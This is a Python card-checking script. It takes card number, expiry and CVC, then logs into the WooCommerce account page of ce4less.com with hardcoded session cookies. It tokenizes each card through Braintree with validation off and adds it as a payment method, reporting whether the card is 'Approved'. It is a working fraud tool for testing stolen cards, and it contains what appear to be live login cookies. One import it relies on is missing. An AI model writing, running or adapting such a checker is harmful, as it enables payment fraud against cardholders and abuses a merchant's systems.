import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	


	
	
	cookies = {
    'br_lgv_stat': 'default%7Cdefault',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-06-15%2019%3A36%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fce4less.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-06-15%2019%3A36%3A04%7C%7C%7Cep%3Dhttps%3A%2F%2Fce4less.com%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'cookielawinfo-checkbox-necessary': 'yes',
    '_gcl_au': '1.1.631200205.1718480170',
    'cookielawinfo-checkbox-functional': 'yes',
    'cookielawinfo-checkbox-performance': 'yes',
    'cookielawinfo-checkbox-analytics': 'yes',
    'cookielawinfo-checkbox-advertisement': 'yes',
    'cookielawinfo-checkbox-others': 'yes',
    'viewed_cookie_policy': 'yes',
    'cli_user_preference': 'en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes',
    'CookieLawInfoConsent': 'eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9',
    'pum-1302612': 'true',
    '_fbp': 'fb.1.1718480171412.585497964215099575',
    '_ga': 'GA1.1.421584245.1718480173',
    'newpass_announce': 'true',
    'closed_announcement': 'true',
    'wordpress_sec_22d584ae58f64e78cb2ffa7e67fadab7': 'kxbvnkzkdjfj%7C1719689838%7CDShp8ksSK9opkDqYXY6OTuPsolHAGMNYWOfSdxPNXMp%7C123ec744ca76633ca40ee18e123f3ac7f9d9bc957b67a070f7644ca3926da59b',
    'wordpress_logged_in_22d584ae58f64e78cb2ffa7e67fadab7': 'kxbvnkzkdjfj%7C1719689838%7CDShp8ksSK9opkDqYXY6OTuPsolHAGMNYWOfSdxPNXMp%7Cd4391ec5f1f51131d7472b3d73fffbad499c887b3a177991520ef7d76985115e',
    'sbjs_session': 'pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fadd-payment-method%2F',
    '__kla_id': 'eyJjaWQiOiJOVFEwTjJFNE5UVXRNalZtTVMwME1HUmtMVGszWldVdE1UWmpOMlV4TXpaalpUbGwiLCIkcmVmZXJyZXIiOnsidHMiOjE3MTg0ODAxNzAsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vY2U0bGVzcy5jb20vIn0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNzE4NDgwMzM2LCJ2YWx1ZSI6IiIsImZpcnN0X3BhZ2UiOiJodHRwczovL2NlNGxlc3MuY29tLyJ9LCIkZXhjaGFuZ2VfaWQiOiJwSlhkbmtzbkpFMFVwX2dJSFFWV2hlM3l2Q001VWxCb3gzbmVYbE91VkZZLlU0VFNxUCJ9',
    '_ga_JVCGZDD7ML': 'GS1.1.1718480172.1.1.1718480336.38.0.958342170',
    '_uetsid': '86663c502b4e11efbe87613bd2046a3c',
    '_uetvid': '866769f02b4e11efb375130d8b5a2663',
}

	headers = {
    'authority': 'ce4less.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'referer': 'https://ce4less.com/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	response = requests.get('https://ce4less.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
	
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	
	client_token_nonce = re.search(r'"client_token_nonce":"(.*?)"', response.text).group(1)
	


	headers = {
    'authority': 'ce4less.com',
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://ce4less.com',
    'pragma': 'no-cache',
    'referer': 'https://ce4less.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

	data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': client_token_nonce,
}

	response = requests.post('https://ce4less.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	
	
	
	enc = response.json()['data']
	
	dec = base64.b64decode(enc).decode('utf-8')
	
	au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
	
	
	

	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '379f0177-032a-47fd-9e6a-56561cd41a24',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)



	tok = response.json()['data']['tokenizeCreditCard']['token']




	headers = {
    'authority': 'ce4less.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://ce4less.com',
    'pragma': 'no-cache',
    'referer': 'https://ce4less.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'master-card',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc_braintree_device_data': '',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post('https://ce4less.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
	
	text = response.text
	
	pattern = r'Status code (.*?)\s*</li>'
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
	
